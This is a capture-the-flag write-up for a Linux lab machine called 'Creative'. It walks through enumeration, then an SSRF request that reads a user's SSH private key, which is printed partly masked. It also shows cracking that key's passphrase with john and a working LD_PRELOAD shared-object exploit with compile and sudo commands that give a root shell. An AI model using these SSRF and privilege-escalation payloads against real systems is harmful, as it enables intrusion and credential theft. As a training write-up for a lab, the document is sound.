# Writeup: Creative

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Fri Nov 28 02:18:22 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.80.189.70
Nmap scan report for 10.80.189.70
Host is up, received user-set (0.082s latency).
Scanned at 2025-11-28 02:18:22 EST for 122s
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:6b:d7:f4:c1:26:0c:0f:58:f0:32:3f:23:dd:d7:4b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5SJ1WYoqQfcuaxqgM8uJy0fSYkUibWtZm97gC27MxtFlJ78XT+EVLIygLfIv5OdpoVXAu6RLdj1WQQQH6AcIci0/I/QI5SPMq4EHGfXdqdsvak1BH1A9fsQiKyIzxrjkupIwEi9RMza6/O5LlmGdtNxz6zeZnJc6UtmRIOXlr8Akx1xNry1dX7KawYchlVuYWOk1fu0VtuEsoD8+4LbJ2Pr9OFyAbFCg8pmHq0iWqQMTRLLnHs3VKKy4omTaWD5UNyl6Rmykx1xarov/8D3++K5EjqnDaMh0bYflT9h4YM4jjU6aBiy7CVBLiZzFibgF8GA0P2gtNoTtCoVB8jD4NIFUvKeBaIFzfXl5JNWHM5yhOxmq9+obx9WShXHlxvh26Rgx3znEKw6uZW5ut9GVxoacikxZy2QjY9tMKaNvQCaNcMKj6kViTQ8ubSkooz8zgp/QW5CnxMoxPHkp+Cq0BPq3BiBj8hwfFOM+pOfXdYIZYFw6ESlLuWqKnk7+wyyM=
|   256 77:ac:24:dd:c7:e5:c7:62:2d:4c:ef:9a:5c:11:c9:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMGlcYS8KRzlCfFSbs1fk7rKdPxjg15/oyJ1B0lWX3EXb3jVukY8No07TR+G7dAJehTAtzU3luTstaWrIH1Avd4=
|   256 e3:4f:c0:f8:4a:5f:90:99:8f:ca:37:a2:d7:ee:e5:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAL/wRTUsB5h6vFJTCSDKe6KZKDOQYJQr1rCs02tt3f+
80/tcp open  http    syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 28 02:20:24 2025 -- 1 IP address (1 host up) scanned in 122.28 seconds
```

On port 80 i found a nginx webserver running, so i have done a directory bruteforce with `gobuster`, but i did not found anything usefull.

```shell
gobuster dir -u http://creative.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 40 -o gobuster_scan
```

```
/assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
/index.html           (Status: 200) [Size: 37589]
/.                    (Status: 200) [Size: 37589]
```

Since the nmap scan shows that the server is redirecting to `http://creative.thm` i have fuzzed for subdomains with `ffuf`, which reveals the `beta` subdomain.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.creative.thm" -u http://creative.thm -fs 178
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 54ms]
:: Progress: [100000/100000] :: Job [1/1] :: 778 req/sec :: Duration: [0:02:15] :: Errors: 0 ::
```

I found a URL Tester under `http://beta.creative.thm` which i used for a portscan on local services on the target machine via Turbo Intruder, a Burpsuite extension. This reveals a service running on http://`127.0.0.1:1337` with directory listing enabled.

## 💥 Exploitation:

I used the found SSRF vulnerability to read the `id_rsa` of the user `saad`.

```http
POST / HTTP/1.1
Host: beta.creative.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://beta.creative.thm
Connection: keep-alive
Referer: http://beta.creative.thm/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F127.0.0.1%3a1337/home/saad/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd
rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe
wBK40FcBuzcLlzjLtfa21TgQxhjBYMPUvwzbgiGpJYEd6sXKeh9FXGYcgXCduq3rz/PSCs
48K+nYJ6Snob95PhfKfFL3x8JMc3sABvU87QxrJQ3PFsYmEzd38tmTiMQkn08Wf7g13MJ6
LzfUwwv9QZXMujHpExowWuwlEKBYiPeEK7mGvS0jJLsaEpQorZNvUhrUO4frSQA6/OTmXE
d/hMX2910cAiCa5NlgBn4nH8y5bjSrygFUSVJiMBVUY0H77mj6gmJUoz5jv96fV+rBaFoB
LGOy00gbX+2YTzBIJsKwOG97Q3HMnMKH+vCL09h/i3nQodWdqLP73U0PK2pu/nUFvGE8ju
nkkRVNqqO5m0eYfdkWHLKz13JzohUBBsLrtj6c9hc8CIqErf5B573RKdhu4gy4JkCMEW1D
xKhNWu+TI3VME1Q0ThJII/TMCR+Ih+/IDwgVTaW0LJR6Cn5nZzUHBLjkDV66vJRYN/3dJ5
bncTJ3dKFpec8AAAWQYx0osErJi/dcuK4vkpBkSG3N3iHsGeQh9KtrGHma9f5/l4HV1O2g
NpdxT+pG8ti5+pJmbA12WIILPWPmq8RlXJoPY2Hg6swPFtgB0KCLotz8XMjYTB0PMHpa4S
98bHQ0G0t3WtkYewKtGIe5J5kEw6YxGVg7/uXQVohACNoniByRMhX2HG6mkXV9p2zi9ym+
Zd7LYPSZ6FTKLouqJbpcADwX6YywSV8uXIGAnT6u5UJMU7EbQhextQYqPOzihsVDUL/uSw
quaPQYJ/8ZqBI5o3on+F2fVbNc7J/5t0gDd0tTzQDFZlMg3zJlnoVkxC+/NLuSrGrzC/52
1gAlLqjcVeGmzXESqWWI+4rF4dnVuwBcHDskZ8TbKEGueBjMX3FdafP0SAl7+gRQNp3OsW
VABMeWJmLDL+reNxAtsPTmDhXuDvoVfITx0V3Bu4UsRJpFl6rJpMgUyjeu3Dff9FjAqQRS
qvsCB1lPAmb50y6v2qveOHJav4DbP7KCYRNR5C1W5R74rDUbLusyWFApWxHVpTDdHY6Zba
+hmqT+kre2Qsg7fvBG7U8Fqe6jf1jVgSIMyUQ1UoowlmdBoP6/eI6Ce3p6lhqAfECb0mHT
Z5tvpxF3QjP6mOPTy1YabeCrsKWoTN821bZUAW0UO5OIGYoQZo5fo6u5g7kj1LmXNG15AU
ZAdKt56miOG5g4SsquDNVaJTQg7rsrVW3ghA4kE+BIRGmTuvKt5q4WZDB6gXXzJgEsZ5Kt
KbURhk1zzqxKprI+yYTrqmxki1EhS2V6qDlYoVscYnIZK9IDV/1c22nNEkSTWhKzHe+6A7
qWNMkOw9xaIdB8WV/yfCf2nOtAAdAYSl28r7c+WSoucqvVBEWhblTqz1oL+bYeDhqRWusP
e+gtkwODGaGQpUl793Eusk6vVYZni5xgOMDuERsREuT2ZsUP20AxVYw/mbUsOjeGpEoCGZ
UBwl2LeGGSDZgZJC+DLOj/Rg0uy9gaADI0Nrwz6ushxqFUg1RDV+WzFxIw9uDqFiL0gHwZ
FXiQLzmLQZ5X1JtWD2nqZwPnM66q9wOeMstYw8+8mJz5E/lTr80Nsde/eVYs3sY9STF+Ye
421hF21P2RLOYv4UM2aQ2hmfUb9MJ99Rj5UvpY83z4uUYu7Vmq2dMDcFsk7Zg8JdNDMg2O
GpgYRcLH44/iPrKRKdtdlVXILLKLjFau8TPzyhKfsa6/3H485Sc/YT94D+bRcx3uL+U003
l7H2rPQ2RDPQeRyLX12uRMcakQLY7zIEyFhH0fMw3rCTcdp/FbkOUEOfXBPkSNWHh7f411
15y/K7bkNDwSi5Ul9yt05uSSEsibJVSfKbvETEFmSQ3tdSVq0PA3ymiBzWixlNOE123KI0
Zs0fwcKpS7h0GzikbIAcrln7ozSgjMzYawbQzEyjjR2QFySMWLGHAW4N7eZ6VfP3dBJxcs
fq4rvw54iukm24T9qAnMXuj1+9joNomiScStTV98RmVy8WMs6WW4r0f7ynhN/S/LYHya+6
D2DK4fRX8v5bY9MAsuqlBIUYH0AVUieyDBnP9QsGNnlIm8TS9UuT/gv/6+sWRpg7H5jkNz
69XRxDuLKV5jVElkEAn/B3bkpkAAcfSfXJphgtYsYbrgchSGtxWMX7FurkWbd0l0WyX//E
8OWhSwGmtO24YBhqQ47nGhDa8ceAJbr0uOIVm+Klfro2D7bPX0Wm2LC65Z6OQGvhrEbQwP
nYcg+D3hFL9ZB4GfAZzwbLAP6EYJ+Tq6I/eiJ5LKs6Q32jMfITUy3wcEPkneMwdOkd35Od
Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS
ksrXEYjaMdndnvxBZ0**********
-----END OPENSSH PRIVATE KEY-----
```

Since the `id_rsa` is password protected i have cracked it using `john`.

```shell
ssh2john id_rsa > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash

...
swee*****        (id_rsa)     
1g 0:00:01:33 DONE (2025-11-28 03:12) 0.01071g/s 10.28p/s 10.28c/s 10.28C/s whitney..sandy
...
```

With the cracked password `swee*****` i was able to ssh in to the target machine as the user `saad`, where i found the `user.txt` in his home directory.


## 🔓 Priviledge Escalation:

In the `.bash_history` of the user `saad` i found the password `MyStrongestPasswo**********`.

I checked the usual things for privesc vectors (sudo -l, cronjobs, etc), but i did not found anything that did catched my attention, so i uploaded `linpeas.sh`, which did found a possible privesc vulnerability (`env_keep+=LD_PRELOAD`).

```
...
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                         
Matching Defaults entries for saad on ip-10-80-189-70:                                                                                                                  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-80-189-70:
    (root) /usr/bin/ping
...
```

To exploit this i had to save following code under `/tmp/evil.c`.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then i had to compile it.

```shell
gcc -fPIC -shared -o evil.so evil.c -nostartfiles
```

Now i just had to run the following command to get a shell as `root`, after that i was able to read the `root.txt`.

```shell
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/ping
```

## 💰 Loot:

```shell
# user.txt
9a1ce90a7653d74ab98630**********

# root.txt
992bfd94b90da48634aed1**********
```